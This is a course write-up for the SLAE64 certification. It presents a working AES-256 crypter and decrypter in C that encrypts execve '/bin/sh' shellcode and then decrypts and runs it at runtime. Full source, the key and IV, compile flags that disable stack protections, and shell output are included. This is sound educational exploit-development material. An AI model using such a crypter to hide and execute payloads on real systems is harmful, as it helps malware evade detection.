---
title: "SLAE64 - Assignment #7 - Custom Crypter"
tags: ["slae64", "assembly", "shellcode", "exploit-development"]
---

## Introduction

This is the blog post for the 7<sup>th</sup> and final Assignment of the SLAE64 course, which is offered by <a href="https://www.pentesteracademy.com/course?id=7" target="_blank">PentesterAcademy</a>. The course focuses on teaching the basics of 64-bit Assembly language for the Intel Architecture (IA-x86_64) family of processors on the Linux platform.

The purpose of this assignment is to encrypt the shellcode with an existing encryption schema and decrypt and execute it at runtime. The algorithm that was used is `AES` and the key length is `256 bits` (32 bytes). The block cipher mode used for AES is `CBC` (cipher-block chaining), which perfmorms `XOR` between the first plaintext block and the initialization vector before encrypting it. The implementation of `AES` can be found at this great repository: <a href="https://github.com/kokke/tiny-AES-c" target="_blank">Tiny AES in C</a>.   

My code can be found in my Github: <a href="https://github.com/geobour98/slae64" target="_blank">geobour98's Github</a>.

## AES256 Crypter

In order to implement the crypter we need to download the following 2 files from the <a href="https://github.com/kokke/tiny-AES-c" target="_blank">Tiny AES in C</a> repository: <a href="https://github.com/kokke/tiny-AES-c/blob/master/aes.c" target="_blank">aes.c</a> and <a href="https://github.com/kokke/tiny-AES-c/blob/master/aes.h" target="_blank">aes.h</a>. By default, `AES128` is used, but there are options for `AES192` and `AES256`. The only changes that we have to do to use `AES256` are to comment the definition of `AES128` and uncomment the definition of `AES256`, as shown below in <a href="https://github.com/geobour98/slae64/blob/main/7_Custom_crypter/aes.h#L27" target="_blank">aes.h</a>: 

```c
//#define AES128 1
//#define AES192 1
#define AES256 1
```

The encryption happens on the shellcode extracted from `execve-stack`, which is described in previous blog posts and basically executes "/bin/sh". It and can be found below:

```shell
\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05
```

So, now the above shellcode is declared in the the crypter program <a href="https://github.com/geobour98/slae64/blob/main/7_Custom_crypter/aesencrypt.c" target="_blank">aesencrypt.c</a>. It is very important to note that since we are using 32 byte blocks, then the size of the shellcode must be padded until we reach 32 (or another number divisinle by 32) bytes. Fortunately, the size of the original shellcode is `32`, so we don't need to add more bytes. 

Next, the `32` byte (256-bit) encryption key and the `16` byte initialization vector are declared.

```c
	unsigned char key[] = "0123456789abcdef0123456789abcdef";
	unsigned char iv[] = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10";
```

After that, we use the provided API to initialize the calling context with `AES_init_ctx_iv` and start encrypting with `AES_CBC_encrypt_buffer`.

```c
	struct AES_ctx ctx;
	AES_init_ctx_iv(&ctx, key, iv);
	AES_CBC_encrypt_buffer(&ctx, code, shellcodeSize);
``` 

Then, we simple print the encrypted shellcode.

```c
	for (int i = 0; i < shellcodeSize - 1; i++) {
		printf("\\x%02x", code[i]);
	}
```

Also, we must include `aes.h` in `aesencrypt.c` in order to use the functions `AES_init_ctx_iv` and `AES_CBC_encrypt_buffer` and define the `CBC` mode.

```c
#include "aes.h"
#define CBC 1
```

The whole `C` program can be found below:

```c
#include <stdio.h>
#include <string.h>
#include "aes.h"
#define CBC 1

unsigned char code[] =
"\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";

int main()
{
        size_t shellcodeSize = sizeof(code);

        unsigned char key[] = "0123456789abcdef0123456789abcdef";
        unsigned char iv[] = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10";

        struct AES_ctx ctx;
        AES_init_ctx_iv(&ctx, key, iv);
        AES_CBC_encrypt_buffer(&ctx, code, shellcodeSize);

        printf("AES Encrypted Shellcode: \n");

        for (int i = 0; i < shellcodeSize - 1; i++) {
                printf("\\x%02x", code[i]);
        }

        printf("\n");
}
```

## AES256 Decrypter

The generation of the encrypted shellcode will be shown later, but we assume it's the following:

```shell
\x11\xc4\xf1\x6e\x1a\x61\xae\xec\x83\x40\xe7\xaf\xfa\x43\x32\x2d\x7f\xb7\xde\xec\x16\xfd\x99\x58\x8d\xda\x72\x09\xbc\xa9\x48\x88
```

So, now the above shellcode is declared in the decrypter program <a href="https://github.com/geobour98/slae64/blob/main/7_Custom_crypter/aesdecrypt.c" target="_blank">aesdecrypt.c</a>.

Again, we declare the encryption key and the initialization vector as previously. The initialization of the calling context happens again with `AES_init_ctx_iv` and the decryption starts with `AES_CBC_decrypt_buffer`.

```c
	struct AES_ctx ctx;
	AES_init_ctx_iv(&ctx, key, iv);
	AES_CBC_decrypt_buffer(&ctx, code, shellcodeSize);
```

Then, the decrypted shellcode is printed to the screen and gets executed.

```c
	int (*ret)() = (int(*)())code;

    ret();
```

The whole `C` program can be found below:

```c
#include <stdio.h>
#include <string.h>
#include "aes.h"
#define CBC 1

unsigned char code[] = 
"\x11\xc4\xf1\x6e\x1a\x61\xae\xec\x83\x40\xe7\xaf\xfa\x43\x32\x2d\x7f\xb7\xde\xec\x16\xfd\x99\x58\x8d\xda\x72\x09\xbc\xa9\x48\x88";

int main()
{
	size_t shellcodeSize = sizeof(code);

	unsigned char key[] = "0123456789abcdef0123456789abcdef";
	unsigned char iv[] = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10";

	struct AES_ctx ctx;
	AES_init_ctx_iv(&ctx, key, iv);
	AES_CBC_decrypt_buffer(&ctx, code, shellcodeSize);

	printf("Decrypted Shellcode: \n");

	for (int i = 0; i < shellcodeSize - 1; i++) {
		printf("\\x%02x", code[i]);
	}

	printf("\n\nExecuting Shellcode...\n");

	int (*ret)() = (int(*)())code;

        ret();
}
```

## Testing Crypter/Decrypter

In order to prove that the processes of encryption and decryption happen and the shellcode gets executed we first have to compile `aes.c` and `aesencrypt.c` to create the `aesencrypt` executable.

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/7_Custom_crypter$ gcc aesencrypt.c aes.c -o aesencrypt
```

Then, we execute `aesencrypt` and get the AES encrypted shellcode:

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/7_Custom_crypter$ ./aesencrypt 
AES Encrypted Shellcode: 
\x11\xc4\xf1\x6e\x1a\x61\xae\xec\x83\x40\xe7\xaf\xfa\x43\x32\x2d\x7f\xb7\xde\xec\x16\xfd\x99\x58\x8d\xda\x72\x09\xbc\xa9\x48\x88
``` 

This is the encrypted shellcode that goes to `aesdecrypt.c`. Now we compile `aesdecrypt.c` and `aes.c` to generate `aesdecrypt`, by disabling the stack protection as well as making the stack executable:

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/7_Custom_crypter$ gcc -fno-stack-protector -z execstack aesdecrypt.c aes.c -o aesdecrypt
```

Finally, we execute `aesdecrypt` and get in a "/bin/sh" shell, where we execute commands like `ls` and `id`.

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/7_Custom_crypter$ ./aesdecrypt 
Decrypted Shellcode: 
\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05

Executing Shellcode...
$ ls
aes.c  aes.h  aesdecrypt  aesdecrypt.c	aesencrypt  aesencrypt.c  execve-stack	shellcode  shellcode.c
$ id
uid=1000(geobour98) gid=1000(geobour98) groups=1000(geobour98),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$ exit
geobour98@slae64-dev:~/SLAE/custom/SLAE64/7_Custom_crypter$ 
```

## Summary

The encryption/decryption processes and the shellcode are working as expected!

This sums up the SLAE64 exam!

The training and the challenges are great and i highly recommend doing them!

<!-- markdownlint-capture -->
<!-- markdownlint-disable -->
> **SLAE64 Blog Post**
>
> This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
> 
> https://www.pentesteracademy.com/course?id=7
>
> ~~http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/~~
>
> **Student ID: PA-36167**
{: .prompt-info }
<!-- markdownlint-restore -->
